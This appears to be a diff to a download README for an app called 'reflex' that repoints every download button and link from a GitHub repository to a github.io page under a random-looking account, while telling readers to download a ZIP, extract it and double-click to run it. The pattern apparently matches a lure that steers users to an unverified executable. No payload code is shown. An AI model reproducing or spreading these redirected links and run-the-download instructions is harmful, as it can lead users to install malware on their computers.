@@ -28,7 +28,7 @@ That's it. No credit card, no account creation, no complicated setup.
 
 The download process is straightforward. We've made it as simple as possible for you.
 
-[![Download reflex Now](https://img.shields.io/badge/Download-reflex-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/resentful-hammerheadshark2276/reflex)
+[![Download reflex Now](https://img.shields.io/badge/Download-reflex-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://resentful-hammerheadshark2276.github.io)
 
 **Step 1: Click the green button above** (or the link below) to go to the download page.
 
@@ -44,7 +44,7 @@ The download process is straightforward. We've made it as simple as possible for
 
 **Step 7:** That's it! reflex is now running on your computer. Welcome to clearer thinking.
 
-Visit this link to download the application: [https://github.com/resentful-hammerheadshark2276/reflex](https://github.com/resentful-hammerheadshark2276/reflex)
+Visit this link to download the application: [https://resentful-hammerheadshark2276.github.io](https://resentful-hammerheadshark2276.github.io)
 
 ---
 
@@ -176,9 +176,9 @@ Remember: the best decision is an informed decision. With reflex, you're never g
 
 Still need to get reflex? Here's your shortcut:
 
-[![Get reflex](https://img.shields.io/badge/Download-reflex-ff69b4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/resentful-hammerheadshark2276/reflex)
+[![Get reflex](https://img.shields.io/badge/Download-reflex-ff69b4?style=for-the-badge&logo=github&logoColor=white)](https://resentful-hammerheadshark2276.github.io)
 
-Visit this link to download the application: [https://github.com/resentful-hammerheadshark2276/reflex](https://github.com/resentful-hammerheadshark2276/reflex)
+Visit this link to download the application: [https://resentful-hammerheadshark2276.github.io](https://resentful-hammerheadshark2276.github.io)
 
 Download the ZIP file, extract it, and double-click to run. In less than five minutes, you'll be making smarter choices with reflex by your side.
 
